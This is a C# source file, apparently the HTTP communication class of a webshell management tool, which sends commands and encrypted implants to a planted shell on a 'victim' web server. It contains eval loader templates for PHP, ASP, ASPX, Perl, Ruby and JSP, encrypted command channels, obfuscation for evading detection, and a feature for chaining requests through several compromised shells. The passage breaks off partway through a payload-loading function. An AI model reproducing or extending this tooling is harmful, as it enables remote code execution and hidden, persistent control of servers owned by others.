using System;
using System.Collections.Generic;
using System.Data.Entity.Core.Mapping;
using System.Linq;
using System.Net.Cache;
using System.Reflection.Metadata;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using System.Text.RegularExpressions;
using System.Text.Json.Nodes;
using System.Text.Json.Serialization;

namespace Alien
{
    public class clsWeb : IDisposable, IAsyncDisposable
    {
        private bool _disposed;

        public clsVictim m_victim { get; init; }
        public clsTamper m_tamper { get; set; }
        public HttpClient m_clnt { get; set; }
        private clsSqlite m_sqlConn { get; init; }

        private AesGcm m_aesgcm { get; set; }
        private string m_szSessionToken { get; set; }
        private bool bTokenExisted { get; set; }
        private int m_nSequence { get; set; }

        private bool m_bInjectedNebularPulsar = false;

        public string m_szLastHttpResponse { get; set; } = string.Empty;

        /// <summary>
        /// 
        /// </summary>
        public static Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "php" },
            { enLanguage.ASP, "asp" },
            { enLanguage.ASPX, "aspx" },
            { enLanguage.ASMX, "asmx" },
            { enLanguage.ASHX, "ashx" },
            { enLanguage.JSP, "jsp" },
            { enLanguage.JSPX, "jspx" },
            { enLanguage.Perl, "pl" },
            { enLanguage.Python, "py" },
            { enLanguage.Ruby, "rb" },
            { enLanguage.CFM, "cfm" }
        };

        public static Dictionary<enLanguage, string> m_dicPayloadExtension = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "php" },
            { enLanguage.ASP, "asp" },
            { enLanguage.ASPX, "aspx" },
            { enLanguage.ASMX, "aspx" },
            { enLanguage.ASHX, "aspx" },
            { enLanguage.JSP, "jsp" },
            { enLanguage.JSPX, "jsp" },
            { enLanguage.Perl, "pl" },
            { enLanguage.Python, "py" },
            { enLanguage.Ruby, "rb" },
            { enLanguage.CFM, "cfm" }
        };

        private readonly Dictionary<enLanguage, Func<string, Func<string, string, string>>> m_dicWrapper = new()
        {
            {
                enLanguage.PHP,
                type => type switch
                {
                    _ => fnWrapPHP
                }
            },
            {
                enLanguage.ASP,
                type => type switch
                {
                    _ => fnWrapVBScript
                }
            },
            {
                enLanguage.ASPX,
                type => type switch
                {
                    "JScript" => fnWrapJScript,
                    _ => throw new NotSupportedException()
                }
            },
            {
                enLanguage.ASMX,
                type => type switch
                {
                    "JScript" => fnWrapJScript,
                    _ => throw new NotSupportedException()
                }
            },
            {
                enLanguage.ASHX,
                type => type switch
                {
                    "JScript" => fnWrapJScript,
                    _ => throw new NotSupportedException()
                }
            },
            {
                enLanguage.Perl,
                type => type switch
                {
                    _ => fnWrapPerl,
                }
            },
            {
                enLanguage.Ruby,
                type => type switch
                {
                    _ => fnWrapRuby,
                }
            },
            {
                enLanguage.JSP,
                type => type switch
                {
                    _ => fnWrapJSP
                }
            },
        };

        /// <summary>
        /// 
        /// </summary>
        public static Dictionary<enLanguage, string[]> m_dicRemoveSyntax = new Dictionary<enLanguage, string[]>()
        {
            {
                enLanguage.PHP,
                new string[]
                {
                    "<?php", "?>",
                }
            },
            {
                enLanguage.ASP,
                new string[]
                {
                    "<%", "%>",
                }
            },
            {
                enLanguage.ASPX,
                new string[]
                {
                    "<%", "%>",
                }
            },
            {
                enLanguage.ASHX,
                new string[]
                {
                    "<%", "%>",
                }
            },
            {
                enLanguage.ASMX,
                new string[]
                {
                    "<%", "%>",
                }
            },
            {
                enLanguage.Perl,
                new string[]
                {
                    "", "",
                }
            },
            {
                enLanguage.Ruby,
                new string[]
                {
                    "", "",
                }
            },
            {
                enLanguage.JSP,
                new string[]
                {
                    "<%", "%>",
                }
            },
        };

        private Dictionary<enLanguage, Func<string, string?>> m_dicDecodeFunc = new Dictionary<enLanguage, Func<string, string?>>()
        {
            {
                enLanguage.PHP, (type) =>
                {
                    return "@eval(base64_decode('[PATTERN]'));";
                }
            },
            {
                enLanguage.ASP, (type) =>
                {
                    return @"Execute(""On Error Resume Next:Function d(s):Set x=CreateObject(""""MSXML2.DOMDocument""""):Set e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End Function:Execute(d(""""[PATTERN]"""")):Response.End"")";
                }
            },
            {
                enLanguage.ASPX, (type) =>
                {
                    if (type == "JScript")
                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}";
                    else if (type == "CSharp")
                        return string.Empty;

                    return null;
                }
            },
            {
                enLanguage.ASHX, (type) =>
                {
                    if (type == "JScript")
                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
                    else if (type == "CSharp")
                        return string.Empty;

                    return null;
                }
            },
            {
                enLanguage.ASMX, (type) =>
                {
                    if (type == "JScript")
                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
                    else if (type == "CSharp")
                        return string.Empty;

                    return null;
                }
            },
            {
                enLanguage.Perl, (type) =>
                {
                    if (type == "CGI")
                        return @"use CGI; use MIME::Base64; print(""Content-Type: text/html\r\n\r\n""); eval(MIME::Base64::decode_base64(""[PATTERN]""));";

                    return null;
                }
            },
            {
                enLanguage.Ruby, (type) =>
                {
                    if (type == "CGI")
                        return @"print ""Content-Type: text/plain\r\n\r\n"";require 'base64';eval(Base64.decode64(""[PATTERN]""));";

                    return null;
                }
            },
            {
                enLanguage.Python, (type) =>
                {
                    if (type == "CGI")
                        return string.Empty;

                    return null;
                }
            },
            {
                enLanguage.JSP, (type) =>
                {

                    return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
                }
            }
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" },
            { enLanguage.ASHX, "Response.Write(\"[SPLITTER]\");" },
            { enLanguage.ASMX, "Response.Write(\"[SPLITTER]\");" },
            { enLanguage.Perl, "print \"[SPLITTER]\";" },
            { enLanguage.Ruby, "print \"[SPLITTER]\";" },
            { enLanguage.JSP, "echo(\"[SPLITTER]\");" },
            //{ enLanguage.CFM, "writeOutput(\"[SPLITTER]\");" }
        };

        private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
        {
            { enLanguage.PHP, clsEzData.fnszStre2b64 },
            { enLanguage.ASP, clsEzData.fnszStre2b64 },
            { enLanguage.ASPX, clsEzData.fnszStre2b64 },
            { enLanguage.ASHX, clsEzData.fnszStre2b64 },
            { enLanguage.ASMX, clsEzData.fnszStre2b64 },
            { enLanguage.JSP, szInput => szInput } // nop
        };

        public clsWeb(clsVictim victim, clsTamper tamper, clsSqlite sqlConn)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            m_victim = victim;
            m_tamper = tamper;
            m_sqlConn = sqlConn;

            var cookieContainer = new CookieContainer();
            var handler = new HttpClientHandler()
            {
                CookieContainer = cookieContainer,
                UseCookies = true,
                AllowAutoRedirect = true,
            };

            m_clnt = new HttpClient(handler)
            {
                BaseAddress = new Uri(m_victim.ShellURL),
                Timeout = TimeSpan.FromMilliseconds(10000),
            };

            string szRandomUA = clsEzData.fnRandomUserAgent();
            m_clnt.DefaultRequestHeaders.UserAgent.ParseAdd(szRandomUA);
        }

        public async ValueTask DisposeAsync()
        {
            if (!_disposed)
            {
                try
                {
                    await fnUnloadNebulaPulsar();
                }
                catch (Exception ex)
                {

                }

                m_aesgcm?.Dispose();
                m_clnt?.Dispose();

                _disposed = true;
            }
        }

        ~clsWeb()
        {
            Dispose(false);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    m_aesgcm?.Dispose();
                    m_clnt?.Dispose();
                }
                _disposed = true;
            }
        }

        private static readonly JsonSerializerOptions s_jsonOpts = new()
        {
            Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
        };

        public async Task<JsonElement> fnGetJson(string szUrl)
        {
            string res = await m_clnt.GetStringAsync(szUrl);
            return JsonDocument.Parse(res).RootElement;
        }

        public async Task<JsonElement> fnPostJson(string szUrl, object objJson)
        {
            string json = JsonSerializer.Serialize(objJson, s_jsonOpts);
            var res = await m_clnt.PostAsync(szUrl, new StringContent(json, Encoding.UTF8, "application/json"));

            string text = res.Content.ReadAsStringAsync().Result;

            return JsonDocument.Parse(text).RootElement;
        }

        private byte[] fnabHKDFExpand(byte[] abIKM, int nLength, string szInfo)
        {
            // PRK = HMAC-SHA256(salt=zeros, IKM)
            using var hmacExtract = new HMACSHA256(new byte[32]); // salt = 32 zero bytes
            byte[] abPRK = hmacExtract.ComputeHash(abIKM);

            // Expand
            using var hmac = new HMACSHA256(abPRK);
            byte[] t = Array.Empty<byte>();
            byte[] abOKM = new byte[nLength];
            int pos = 0;
            byte counter = 1;

            while (pos < nLength)
            {
                byte[] infoBytes = Encoding.UTF8.GetBytes(szInfo);
                byte[] abInput = new byte[t.Length + infoBytes.Length + 1];
                Buffer.BlockCopy(t, 0, abInput, 0, t.Length);
                Buffer.BlockCopy(infoBytes, 0, abInput, t.Length, infoBytes.Length);
                abInput[^1] = counter++;

                hmac.Key = abPRK; // reset key each round
                t = hmac.ComputeHash(abInput);

                int nCopyLen = Math.Min(t.Length, nLength - pos);
                Buffer.BlockCopy(t, 0, abOKM, pos, nCopyLen);
                pos += nCopyLen;
            }

            return abOKM;
        }

        private string fnszPemEncode(string label, byte[] data)
        {
            string b64 = Convert.ToBase64String(data);

            StringBuilder sb = new();

            sb.AppendLine($"-----BEGIN {label}-----");

            for (int i = 0; i < b64.Length; i += 64)
            {
                sb.AppendLine(b64.Substring(i, Math.Min(64, b64.Length - i)));
            }

            sb.Append($"-----END {label}-----");

            return sb.ToString().Replace("\r\n", "\n");
        }

        private string fnBuildHttpDump(string url, HttpContent content, HttpResponseMessage resp, string responseBody)
        {
            var uri = new Uri(url);
            var sb = new StringBuilder();

            sb.AppendLine($"POST {uri.PathAndQuery} HTTP/1.1");
            sb.AppendLine($"Host: {uri.Host}");

            if (content != null)
            {
                foreach (var h in content.Headers)
                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");

                sb.AppendLine();
                sb.AppendLine(content.ReadAsStringAsync().Result);
            }
            else
            {
                sb.AppendLine();
            }

            sb.AppendLine();

            if (resp != null)
            {
                sb.AppendLine($"HTTP/{resp.Version} {(int)resp.StatusCode} {resp.ReasonPhrase}");

                foreach (var h in resp.Headers)
                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");

                foreach (var h in resp.Content.Headers)
                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");

                sb.AppendLine();
            }

            sb.AppendLine(responseBody);

            return sb.ToString();
        }

        /// <summary>
        /// HTTP POST request.
        /// </summary>
        /// <param name="szPayloadData"></param>
        /// <param name="szSplitter"></param>
        /// <returns></returns>
        public async Task<string> fnHttpPOST(stShellConfig config, Dictionary<stShellConfig, string> dicSplitter, string szPayloadData, string szSplitter)
        {
            HttpContent? content = null;
            HttpResponseMessage resp;
            string szRespContent = string.Empty;

            try
            {
                // Encryption is enabled
                if (string.IsNullOrEmpty(config.ID))
                    config = m_victim.m_ShellConfig;

                if (config.payloadType == enPayloadType.ECDH)
                {
                    // Handshake
                    if (!bTokenExisted)
                    {
                        var httpResp = await fnGetJson(config.szUrl);

                        string szSignPubPem = httpResp.GetProperty("signPubKey").GetString().Trim();
                        string szServerEcdhPem = httpResp.GetProperty("serverEcdhPub").GetString().Trim();
                        byte[] abSignature = Convert.FromBase64String(httpResp.GetProperty("signature").GetString());
                        string szHandshakeToken = httpResp.GetProperty("handshakeToken").GetString();

                        byte[] abServerEcdh = Encoding.UTF8.GetBytes(szServerEcdhPem);

                        using RSA signPub = RSA.Create();
                        signPub.ImportFromPem(szSignPubPem);

                        bool bVerified = signPub.VerifyData(
                            abServerEcdh,
                            abSignature,
                            HashAlgorithmName.SHA256,
                            RSASignaturePadding.Pkcs1
                        );

                        if (!bVerified)
                            throw new Exception("Server identity verification failed");

                        // client ECDH
                        using (ECDiffieHellman clntEcdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256))
                        {
                            byte[] abClntEcdhPub = clntEcdh.ExportSubjectPublicKeyInfo();
                            string szEcdhPubPem = fnszPemEncode("PUBLIC KEY", abClntEcdhPub).Replace("\r\n", "\n").Trim();

                            // client signing key
                            using ECDsa dsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
                            byte[] abClntSignPub = dsa.ExportSubjectPublicKeyInfo();
                            string szClntSignPubPem = fnszPemEncode("PUBLIC KEY", abClntSignPub).Replace("\r\n", "\n").Trim();

                            byte[] abClntSign = dsa.SignData(
                                Encoding.UTF8.GetBytes(szEcdhPubPem),
                                HashAlgorithmName.SHA256,
                                DSASignatureFormat.Rfc3279DerSequence
                            );

                            var handshakeResp = await fnPostJson(config.szUrl, new
                            {
                                handshakeToken = szHandshakeToken,
                                clientEcdhPub = szEcdhPubPem,
                                clientSignPub = szClntSignPubPem,
                                clientSig = Convert.ToBase64String(abClntSign)
                            });

                            if (handshakeResp.TryGetProperty("error", out var err))
                                throw new Exception($"Handshake failed: {err.GetString()}");

                            m_szSessionToken = handshakeResp.GetProperty("sessionToken").GetString();

                            // derive shared secret
                            using ECDiffieHellman servEcdh = ECDiffieHellman.Create();
                            servEcdh.ImportFromPem(szServerEcdhPem);

                            byte[] abSharedSecret = clntEcdh.DeriveRawSecretAgreement(servEcdh.PublicKey);
                            byte[] abAesKey = fnabHKDFExpand(abSharedSecret, 32, "secure-channel");

                            m_aesgcm = new AesGcm(abAesKey, 16);

                            bTokenExisted = true;
                        }
                    }

                    if (m_aesgcm == null)
                        throw new Exception("Crypto not initialized");

                    var obj = new
                    {
                        cmd = "eval",
                        seq = m_nSequence,
                        data = szPayloadData
                    };

                    //MessageBox.Show(szPayloadData);

                    byte[] plaintext = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj, s_jsonOpts));

                    byte[] nonce = RandomNumberGenerator.GetBytes(12);
                    byte[] ciphertext = new byte[plaintext.Length];
                    byte[] tag = new byte[16];

                    m_aesgcm.Encrypt(nonce, plaintext, ciphertext, tag);

                    byte[] combined = new byte[12 + 16 + ciphertext.Length];

                    Buffer.BlockCopy(nonce, 0, combined, 0, 12);
                    Buffer.BlockCopy(tag, 0, combined, 12, 16);
                    Buffer.BlockCopy(ciphertext, 0, combined, 28, ciphertext.Length);

                    string encryptedPayload = Convert.ToBase64String(combined);

                    var encryptedBody = JsonSerializer.Serialize(new
                    {
                        sessionToken = m_szSessionToken,
                        payload = encryptedPayload
                    }, s_jsonOpts);

                    content = new StringContent(
                        encryptedBody,
                        Encoding.UTF8,
                        "application/json"
                    );
                }
                else
                {
                    // OneShell

                    content = new StringContent(
                        szPayloadData,
                        Encoding.GetEncoding(config.szEncoding),
                        config.bEHEnable ? "text/plain" : "application/x-www-form-urlencoded"
                    );
                }

                resp = await m_clnt.PostAsync(config.szUrl, content);
                szRespContent = await resp.Content.ReadAsStringAsync();

                //MessageBox.Show(szRespContent);

                if (m_victim.ShellPayloadType == enPayloadType.OneShell)
                {
                    foreach (var c in dicSplitter.Keys)
                    {
                        string split = $"[{dicSplitter[c]}]";
                        string[] s = szRespContent.Split(split);
                        if (s.Length > 1)
                            szRespContent = s[1];

                        if (c.bEHEnable)
                        {
                            szRespContent = await m_tamper.fnDeobfuscate(c.szEventHorizonScript, szRespContent, JsonSerializer.Deserialize<Dictionary<string, object>>(c.szEventHorizonConfig));
                        }
                    }

                    if (m_victim.m_ShellConfig.bEHEnable)
                    {
                        MessageBox.Show("XXX");
                        var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(m_victim.m_ShellConfig.szEventHorizonConfig);
                        if (dicParam == null)
                            throw new Exception("Invalid JSON string");

                        szRespContent = await m_tamper.fnDeobfuscate(m_victim.m_ShellConfig.szEventHorizonScript, szRespContent, dicParam);
                    }

                    szSplitter = $"[{szSplitter}]";

                    try
                    {
                        if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
                        {
                            string[] splits = szRespContent.Split(szSplitter);
                            if (splits.Length != 3)
                                throw new Exception();
    
                            return splits[1];
                        }
                        else
                        {
                            throw new Exception();
                        }
                    }
                    catch
                    {
                        m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                        return string.Empty;
                    }
                }

                if (resp.IsSuccessStatusCode)
                {
                    try
                    {
                        // After getting szRespContent, parse the JSON envelope first
                        var respJson = JsonDocument.Parse(szRespContent).RootElement;

                        // Update session token for next request
                        m_szSessionToken = respJson.GetProperty("sessionToken").GetString();

                        // Then decrypt the payload
                        string? szResp = respJson.GetProperty("payload").GetString();
                        if (string.IsNullOrEmpty(szResp))
                            throw new Exception("HTTP response is empty.");

                        //MessageBox.Show(szResp);

                        byte[] enc = Convert.FromBase64String(szResp);

                        byte[] respNonce = enc[..12];
                        byte[] respTag = enc[12..28];
                        byte[] respCt = enc[28..];

                        byte[] decrypted = new byte[respCt.Length];
                        m_aesgcm.Decrypt(respNonce, respCt, respTag, decrypted);

                        m_nSequence++;

                        string result = Encoding.UTF8.GetString(decrypted);
                        JsonDocument json = JsonDocument.Parse(result);
                        JsonElement root = json.RootElement;

                        string? val = root.GetProperty("eval").GetString();
                        if (string.IsNullOrEmpty(val))
                            throw new Exception("Value is null or empty.");

                        val = clsEzData.fnszB64d2str(val).Replace("\r\n", string.Empty).Trim('\r').Trim('\n');
                        szSplitter = $"[{szSplitter}]";
                        val = val.Split(szSplitter)[1];

                        return val;
                    }
                    catch (Exception ex)
                    {
                        m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                        return string.Empty;
                    }
                }
                else
                {
                    m_szLastHttpResponse = fnBuildHttpDump(config.szUrl, content, resp, szRespContent);
                    return string.Empty;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }

        public async Task<byte[]> fnabHttpPOST(string szPayloadData, string szSplitter)
        {
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            byte[] abResp = await resp.Content.ReadAsByteArrayAsync();
            string szResp = Encoding.UTF8.GetString(abResp);

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szResp.Contains(szSplitter))
            {
                szResp = szResp.Split(szSplitter)[1];

                byte[] abSplitter = Encoding.UTF8.GetBytes(szSplitter);
                
                int nStartIdx = fnIndexOf(abResp, abSplitter, 0);
                if (nStartIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                nStartIdx += abSplitter.Length;

                int nEndIdx = fnIndexOf(abResp, abSplitter, nStartIdx);
                if (nEndIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                long nLength = nEndIdx - nStartIdx;
                byte[] abBuffer = new byte[nLength];
                Array.Copy(abResp, nStartIdx, abResp, 0, nLength);

                return abBuffer;
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szResp);
                return new byte[] { };
            }
        }

        private int fnIndexOf(byte[] haystack, byte[] needle, int start)
        {
            for (int i = start; i <= haystack.Length - needle.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        /// <summary>
        /// Do HTTP web connection to check alive.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestWebConnection(bool bShowError = true)
        {
            try
            {
                using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                {
                    int statusCode = (int)resp.StatusCode;
                    HttpStatusCode code = resp.StatusCode;

                    resp.EnsureSuccessStatusCode();

                    string szResult = await resp.Content.ReadAsStringAsync();

                    if (!resp.IsSuccessStatusCode)
                        throw new Exception(szResult);

                    return resp.IsSuccessStatusCode;
                }
            }
            catch (Exception ex)
            {
                if (bShowError)
                    MessageBox.Show(ex.Message, "fnbTestWebConnection()");

                return false;
            }
        }

        /// <summary>
        /// Execute test payload.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestShellConnection(bool bShowError = true)
        {
            try
            {
                string szPattern = clsEzData.fnszGenerateRandomStr();
                string szResp = await fnszSendPayload("test", new string[] { szPattern });

                bool bVal = string.Equals(szResp, szPattern);
                if (!bVal)
                    throw new Exception(szResp);

                return bVal;
            }
            catch (Exception ex)
            {
                if (bShowError)
                    MessageBox.Show(ex.Message, "fnbTestShellConnection()");

                return false;
            }
        }

        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();

            if (m_victim.ShellPayloadType == enPayloadType.DarkMatter)
            {
                // NebulaPulsar

                for (int i = 0; i < asParams.Length; i++)
                    asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

                string szParams = string.Join("&", asParams);

                try
                {
                    string szKey = m_victim.ShellPassword;
                    string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
                    //szHashKey = "NBPULSARDEADBEEF";
                    //MessageBox.Show(szHashKey);
                    byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);

                    if (!m_bInjectedNebularPulsar)
                    {
                        byte[]? abNebulaPulsar = fnGetNebulaPulsar();

                        if (abNebulaPulsar == null)
                            throw new Exception("NebulaPulsar is null or empty");


                        byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);

                        using (var content = new ByteArrayContent(abEncryptedImplant))
                        {
                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                            {
                                CharSet = m_victim.ShellEncoding,
                            };

                            HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                            resp.EnsureSuccessStatusCode();
                        }

                        m_bInjectedNebularPulsar = true;
                    }

                    byte[]? abDarkMatter = fnGetDarkMatter(szPayloadName);

                    if (abDarkMatter == null)
                        throw new Exception("DarkMatter is null or empty");

                    bool bVolatile = true;
                    string szMode = bVolatile ? "volatile" : "persistent";
                    string szParamStr = $"action=TEST&mode={szMode}&splitter={szSplitter}" + (string.IsNullOrEmpty(szParams) ? string.Empty : $"&{szParams}");
                    byte[] abParamStr = Encoding.UTF8.GetBytes(szParamStr);

                    int nLength = abDarkMatter.Length;
                    byte[] abLength = BitConverter.GetBytes(nLength);
                    if (BitConverter.IsLittleEndian)
                        Array.Reverse(abLength);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        ms.Write(abLength, 0, abLength.Length);
                        ms.Write(abDarkMatter, 0, abDarkMatter.Length);
                        ms.Write(abParamStr, 0, abParamStr.Length);

                        byte[] abRawPayload = ms.ToArray();
                        byte[] abEncryptedPayload = clsCrypto.fnAesEncrypt(abRawPayload, abHashKey);
                        
                        using (var content = new ByteArrayContent(abEncryptedPayload))
                        {
                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                            {
                                CharSet = m_victim.ShellEncoding,
                            };

                            HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                            resp.EnsureSuccessStatusCode();

                            byte[] abEncResp = await resp.Content.ReadAsByteArrayAsync();
                            byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);

                            Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
                            string szResp = encoding.GetString(abResp);

                            return szResp;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return string.Empty;
                }
            }

            var config = m_victim.m_ShellConfig;
            string szPayload = await fnGetPayload(config, szPayloadName, szSplitter, asParams);

            if (szPayload.Contains("[ENCODING]"))
                szPayload = szPayload.Replace("[ENCODING]", m_victim.ShellEncoding);

            if (m_victim.ShellPayloadType == enPayloadType.ECDH)
            {
                szPayload = clsTamper.fnMergePayloadToOne(m_victim.m_ShellConfig, szPayload, asParams, m_victim.ShellLanguage);
            }
            else
            {
                //OneShell

                for (int i = 0; i < asParams.Length; i++)
                {
                    if (config.bEHEnable)
                        asParams[i] = clsEzData.fnszStre2b64(asParams[i]);
                    else
                        asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
                }

                if (config.bEHEnable)
                    szPayload = clsTamper.fnMergePayloadToOne(m_victim.m_ShellConfig, szPayload, asParams, config.language);

                string szPayloadMethod = m_victim.m_ShellConfig.szMethod;

                string szParams = string.Join("&", asParams);
                //string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)));
                string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod);
                if (string.IsNullOrEmpty(szLoader))
                    throw new Exception("Cannot find any loader for: " + Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage));

                szLoader = szLoader
                    .Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))
                    .Replace("[ENCODING]", m_victim.ShellEncoding);

                szLoader = Uri.EscapeDataString(szLoader);

                szPayload = (config.bEHEnable ? string.Empty : $"{m_victim.ShellPassword}=") + szLoader + (config.bEHEnable ? string.Empty : $"&{szParams}");
                if (config.bEHEnable)
                    szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szPayload, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));

            }

            if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
            {
                var configs = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
                configs.Reverse();

                var result = await fnDriftingComet(configs, Uri.EscapeDataString(szPayload));

                List<string> lsSplitter = result.lsSplitter;
                lsSplitter.Reverse();

                Dictionary<stShellConfig, string> dicSplitter = new Dictionary<stShellConfig, string>();

                for (int i = 0; i < lsSplitter.Count; i++)
                    dicSplitter.Add(configs[i], lsSplitter[i]);

                string szFinalPayload = string.Empty;

                if (!result.config.bEHEnable)
                {
                    int idxFirstEq = result.szComet.IndexOf('=');
                    if (idxFirstEq == -1)
                        throw new Exception("Invalid comet payload format.");

                    string szPass = result.szComet.Substring(0, idxFirstEq);
                    string szRealPayload = result.szComet.Substring(idxFirstEq + 1);

                    szRealPayload = Uri.EscapeDataString(szRealPayload);
                    szFinalPayload = $"{szPass}={szRealPayload}";
                }
                else
                {
                    szFinalPayload = Uri.EscapeDataString(result.szComet);
                }

                return await fnHttpPOST(result.config, dicSplitter, szFinalPayload, szSplitter);
            }

            return await fnHttpPOST(new stShellConfig(), new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
        }

        /// <summary>
        /// Read payload from file with specified language, method and payload type.
        /// </summary>
        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
        /// <returns>Payload content</returns>
        private async Task<string> fnGetPayload(stShellConfig config, string szPayloadName, string szSplitter, string[] asParams = null)
        {
            string szSuffix = m_dicPayloadExtension[config.language];
            string szPayloadFilePath = Path.Combine(new string[]
            {
                "Payload",
                config.language.ToString(),
                config.szMethod,
                config.payloadType.ToString(),
                $"{szPayloadName}.{szSuffix}",
            });

            if (File.Exists(szPayloadFilePath))
            {
                string szPayload = File.ReadAllText(szPayloadFilePath);
                foreach (string szPattern in m_dicRemoveSyntax[config.language])
                {
                    if (string.IsNullOrEmpty(szPattern))
                        continue;

                    szPayload = szPayload.Replace(szPattern, string.Empty);
                }


                string szSplitFunc = m_dicSplitter[config.language].Replace("SPLITTER", szSplitter);
                szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";

                if (m_dicWrapper.ContainsKey(config.language))
                {
                    string szEncryptor = string.Empty;
                    if (config.bEHEnable && !string.IsNullOrEmpty(config.szEventHorizonScript))
                    {
                        if (m_tamper == null)
                            throw new Exception("Tamper object is null");

                        Dictionary<string, object>? dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
                        if (dicParam == null)
                            dicParam = new Dictionary<string, object>();

                        dicParam["script"] = Enum.GetName(typeof(enLanguage), config.language);

                        szEncryptor = await m_tamper.fnGetObfuscator(config.szEventHorizonScript, dicParam);
                        if (string.IsNullOrEmpty(szEncryptor))
                            szEncryptor = string.Empty;

                        
                    }

                    string szMethod = config.szMethod;
                    szPayload = m_dicWrapper[config.language](szMethod)(szPayload, szEncryptor);

                    if (szPayloadName.Equals("eval"))
                        asParams[0] = m_dicWrapper[config.language](szMethod)(asParams[0], "*");
                }

                //MessageBox.Show(szPayload);

